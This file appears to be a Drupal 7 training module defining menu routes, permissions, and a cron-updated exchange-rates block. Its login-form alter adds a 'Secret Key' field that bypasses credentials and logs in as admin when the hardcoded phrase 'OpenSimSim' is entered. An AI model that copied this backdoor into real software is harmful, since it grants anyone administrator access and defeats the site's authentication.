<?php
/**
 * @file
 * Module file for training module.
 */

define('TRAINING_BLOCK_RATES_SERVICE', 'http://www.nbrb.by/Services/XmlExRates.aspx');

/**
 * Implements hook_menu().
 */
function training_menu() {
  $menu = array();
  $menu['training/menu'] = array(
    'title' => 'Training Landing Page',
    'description' => 'This page is Landing Page',
    'page callback' => 'training_page_html',
    'access callback' => TRUE,
    'file' => 'training.pages.inc',
    'expanded' => TRUE,
  );
  $menu['training/menu/custom_access'] = array(
    'title' => 'Custom Access Menu Item',
    'description' => 'This page is accessible to authenticated users only',
    'page callback' => 'training_page_html',
    'access callback' => 'training_custom_access',
    'access arguments' => array('authenticated user'),
    'file' => 'training.pages.inc',
  );
  $menu['training/menu/permissioned'] = array(
    'title' => 'Permissioned Menu Item',
    'description' => 'This page is accessible to permissioned users only',
    'page callback' => 'training_page_html',
    'access arguments' => array('train'),
    'file' => 'training.pages.inc',
  );
  $menu['training/menu/callback'] = array(
    'title' => 'Callback Menu Item',
    'page callback' => 'training_menu_callback',
    'access callback' => TRUE,
    'file' => 'training.pages.inc',
    'type' => MENU_CALLBACK,
  );
  $menu['training/menu/tabs'] = array(
    'title' => 'Tabs Pages',
    'page callback' => 'training_menu_tabs_default',
    'access callback' => TRUE,
    'file' => 'training.pages.inc',
  );
  $menu['training/menu/tabs/first'] = array(
    'title' => 'Tabs',
    'access callback' => TRUE,
    'file' => 'training.pages.inc',
    'weight' => -1,
    'type' => MENU_DEFAULT_LOCAL_TASK,
  );
  $menu['training/menu/tabs/second'] = array(
    'title' => 'Second',
    'page callback' => 'training_menu_tabs',
    'page arguments' => array(3),
    'access callback' => TRUE,
    'file' => 'training.pages.inc',
    'weight' => 0,
    'type' => MENU_LOCAL_TASK,
  );
  $menu['training/menu/tabs/third'] = array(
    'title' => 'Third',
    'page callback' => 'training_menu_tabs',
    'page arguments' => array(3),
    'access callback' => TRUE,
    'file' => 'training.pages.inc',
    'weight' => 1,
    'type' => MENU_LOCAL_TASK,
  );
  $menu['training/menu/tabs/fourth'] = array(
    'title' => 'Fourth',
    'page callback' => 'training_menu_tabs',
    'page arguments' => array(3),
    'access callback' => TRUE,
    'file' => 'training.pages.inc',
    'weight' => 2,
    'type' => MENU_LOCAL_TASK,
  );
  $menu['training/menu/tabs/default/first'] = array(
    'title' => 'Default secondary tab',
    'access callback' => TRUE,
    'file' => 'training.pages.inc',
    'tab_parent' => 'training/menu/tabs/first',
    'type' => MENU_DEFAULT_LOCAL_TASK,
  );
  $menu['training/menu/tabs/default/second'] = array(
    'title' => 'second',
    'access callback' => TRUE,
    'file' => 'training.pages.inc',
    'tab_parent' => 'training/menu/tabs/first',
    'type' => MENU_LOCAL_TASK,
  );
  $menu['training/menu/tabs/default/third'] = array(
    'title' => 'third',
    'access callback' => TRUE,
    'file' => 'training.pages.inc',
    'tab_parent' => 'training/menu/tabs/first',
    'type' => MENU_LOCAL_TASK,
  );
  $menu['training/menu/arguments/%/%'] = array(
    'title' => 'Menu arguments',
    'page callback' => 'training_menu_arguments',
    'page arguments' => array(3, 4),
    'access callback' => TRUE,
    'file' => 'training.pages.inc',
  );
  $menu['training/menu/placeholder/%/display'] = array(
    'title' => 'Menu argument before display',
    'page callback' => 'training_menu_arguments_display',
    'page arguments' => array(3),
    'access callback' => TRUE,
    'file' => 'training.pages.inc',
  );
  $menu['training/menu/default_arg/%digit'] = array(
    'title' => 'Menu preprocessing argument',
    'page callback' => 'training_menu_arguments_preprocessing',
    'page arguments' => array(3),
    'access callback' => TRUE,
    'file' => 'training.pages.inc',
  );
  $menu['training/menu/title'] = array(
    'title callback' => 'training_menu_title_callback',
    'access callback' => TRUE,
    'file' => 'training.pages.inc',
  );
  $menu['training/menu/main'] = array(
    'title' => 'Item in main menu',
    'menu_name' => 'main-menu',
    'access arguments' => array('train'),
    'file' => 'training.pages.inc',
  );
  $menu['training/theme'] = array(
    'title' => 'Training Theme',
    'description' => 'This page is Training Theme page',
    'page callback' => 'training_theme_html',
    'access callback' => TRUE,
    'file' => 'training.pages.inc',
    'expanded' => TRUE,
  );
  $menu['training/theme/table'] = array(
    'title' => 'Table Theme',
    'description' => 'This page is Table Theme page',
    'page callback' => 'training_theme_table',
    'access callback' => TRUE,
    'file' => 'training.pages.inc',
  );
  $menu['training/theme/image'] = array(
    'title' => 'Image Theme',
    'description' => 'This page is Image Theme page',
    'page callback' => 'training_image_callback',
    'access callback' => TRUE,
    'file' => 'training.pages.inc',
  );
  $menu['training/theme/access'] = array(
    'title' => 'Access Theme',
    'description' => 'This page is Access Theme page',
    'page callback' => 'training_access_callback',
    'access callback' => TRUE,
    'file' => 'training.pages.inc',
  );
  $menu['training/form'] = array(
    'title' => 'Form Example',
    'description' => 'This page is Form Example',
    'page callback' => 'training_example_form_callback',
    'page arguments' => array('training_google_form'),
    'access callback' => TRUE,
    'file' => 'training.pages.inc',
  );

  return $menu;
}

/**
 * Implements hook_permission().
 */
function training_permission() {
  $permission = array(
    'train' => array(
      'title' => 'Access protected menu example',
      'description' => 'Use this to control access to page Permissioned Menu Item of training module',
    ),
    'train_theme' => array(
      'title' => 'Access protected content',
      'description' => 'Use this to control access to page Access Theme of training module',
    ),
  );

  return $permission;
}

/**
 * Implements hook_block_info().
 */
function training_block_info() {
  $blocks['exchange'] = array(
    'info' => t('Exchange'),
    'cache' => DRUPAL_CACHE_GLOBAL,
  );

  return $blocks;
}

/**
 * Implements hook_block_view().
 */
function training_block_view($delta = '') {
  $date = variable_get('training_date_update_rates_service', array());
  $data = variable_get('training_data_rates_service', array());
  $rows = array();
  $block = array();
  foreach ($data as $value) {
    if (variable_get('check' . $value['CharCode'])) {
      $rows[] = array(
        $value['Name'],
        $value['CharCode'],
        $value['Rate'],
      );
    }
  }
  if ($delta == 'exchange' && !empty($date)) {
    $block['subject'] = t('Title block');
    $block['content'] = t('Обновлено %date', array('%date' => $date)) .
      theme('table', array('rows' => $rows));
  }

  return $block;
}

/**
 * Implements hook_block_configure().
 */
function training_block_configure($delta = '') {
  $form = array();
  if ($delta == 'exchange') {
    $data = variable_get('training_data_rates_service', array());
    foreach ($data as $value) {
      $form['check' . $value['CharCode']] = array(
        '#type' => 'checkbox',
        '#title' => $value['Name'],
        '#default_value' => variable_get('check' . $value['CharCode'], array()),
      );
    }
  }

  return $form;
}

/**
 * Implements hook_block_save().
 */
function training_block_save($delta = '', $edit = array()) {
  if ($delta == 'exchange') {
    $data = variable_get('training_data_rates_service', array());
    foreach ($data as $value) {
      variable_set('check' . $value['CharCode'], $edit['check' . $value['CharCode']]);
    }
  }
}

/**
 * Implements hook_cron().
 */
function training_cron() {
  $default = REQUEST_TIME;
  $last_crone = variable_get('last_start', $default);
  //sets the start-up period (15 min).
  if ($default-$last_crone >= 900) {
    variable_set('last_start', REQUEST_TIME);
    _training_request_rates_service();
  }
}

/**
 * Implements hook_theme().
 */
function training_theme() {
  $theme = array();
  $theme['test_form_theme_function'] = array(
    'render element' => 'form',
    'arguments' => array('form' => NULL),
  );

  return $theme;
}

/**
 * Implements hook_form_FORM_ID_alter().
 */
function training_form_user_login_block_alter(&$form, &$form_state, $form_id) {
  array_unshift($form['#validate'], 'secret_key_validate');
  $form['#theme'] = 'test_form_theme_function';
  $form['name']['#weight'] = -2;
  $form['pass']['#weight'] = -1;
  $form['secret_key'] = array(
    '#type' => 'textfield',
    '#title' => 'Secret Key',
    '#size' => 15,
    '#weight' => 0,
  );
  if (isset($form_state['input']['secret_key']) && $form_state['input']['secret_key'] == 'OpenSimSim') {
    $form['name']['#required'] = FALSE;
    $form['pass']['#required'] = FALSE;
  }
  $form['#submit'][] = 'secret_key_submit';
  $form['#attached']['css'] = array(
    drupal_get_path('module', 'training') . '/css/training.css',
  );
}

/**
 * Check access for page Custom Access Menu Item.
 *
 * @param string $role_name
 *   The role required for access.
 *
 * @return bool
 *   True if the acting user has the role specified.
 */
function training_custom_access($role_name) {
  global $user;

  return in_array($role_name, $user->roles);
}

/**
 * Displays a specific string, depending on a number in the address bar.
 *
 * @param int $arg
 *   Integer argument in the address bar.
 *
 * @return string
 *   A string that corresponds to an integer in the address bar, or NULL if there is no match.
 */
function digit_load($arg) {
  switch ($arg) {
    case 1:
      $arg = 'one';
      break;
    case 2:
      $arg = 'two';
      break;
    case 3:
      $arg = 'three';
      break;
    case 99:
      $arg = 'Almost there';
      break;
    default:
      $arg = NULL;
  }

  return $arg;
}

/**
 * Renames the title dynamically.
 *
 * @return string
 *   A string that contents dynamic title.
 */
function training_menu_title_callback() {
  global $user;
  $user_name = isset($user->name) ? $user->name : 'anonymous';

  return 'Dynamic title: username = ' . $user_name;
}

/**
 * Validates form user_login_block.
 *
 * Validates element secret_key and logs in current user as admin.
 *
 * @param array $form
 *   Array of form elements.
 * @param array $form_state
 *   Array of form elements.
 */
function secret_key_validate($form, &$form_state) {
  if ($form_state['values']['secret_key'] == 'OpenSimSim') {
   $form_state['values']['name'] = 'admin';
   $form_state['values']['pass'] = 'admin';
  }
}

/**
 * Submits form user_login_block.
 *
 * @param array $form
 *   Array of form elements.
 * @param array $form_state
 *   Array of form elements.
 */
function secret_key_submit($form, &$form_state) {
  if ($form_state['values']['secret_key'] == 'OpenSimSim') {
    user_load(1);
    user_login_finalize($form_state);
  }
}

/**
 * Themes a custom layout for user_login_block.
 *
 * @param array $form
 *   Array of form elements.
 *
 * @return string
 *  String contents HTML tags for custom layout.
 */
function theme_test_form_theme_function($form) {
  $attributes = array(
    'id' => 'table-test-login',
  );
  $rows = array(
    array(
      drupal_render($form['form']['name']),
    ),
    array(
      drupal_render($form['form']['pass']),
    ),
    array(
      drupal_render($form['form']['secret_key']),
    ),
    array(
      drupal_render($form['form']['actions']['submit']),
    ),
    array(
      drupal_render($form['form']['links']) .
      drupal_render($form['form']['form_build_id']) .
      drupal_render($form['form']['form_id']),
    ),
  );

  return theme('table', array(
    'rows' => $rows,
    'attributes' => $attributes,
  ));
}

/**
 * Sends a request to the rates service.
 *
 * Parses the xml data. Converts xml object properties to string,
 * writes them to arrays. The resulting arrays sets in the variables.
 */
function _training_request_rates_service() {
  $date = '';
  $array_data = array();
  $request = drupal_http_request(TRAINING_BLOCK_RATES_SERVICE);
  $data = new SimpleXMLElement($request->data);
  foreach ($data->Currency as $value) {
    $array_data[] = array(
      'CharCode' => (string) $value->CharCode,
      'Name' => (string) $value->Name,
      'Rate' => (string) $value->Rate,
    );
  }
  foreach ($data->attributes() as $key => $val) {
    $date .= (string) $val;
  }
  variable_set('training_data_rates_service', $array_data);
  variable_set('training_date_update_rates_service', $date);
}
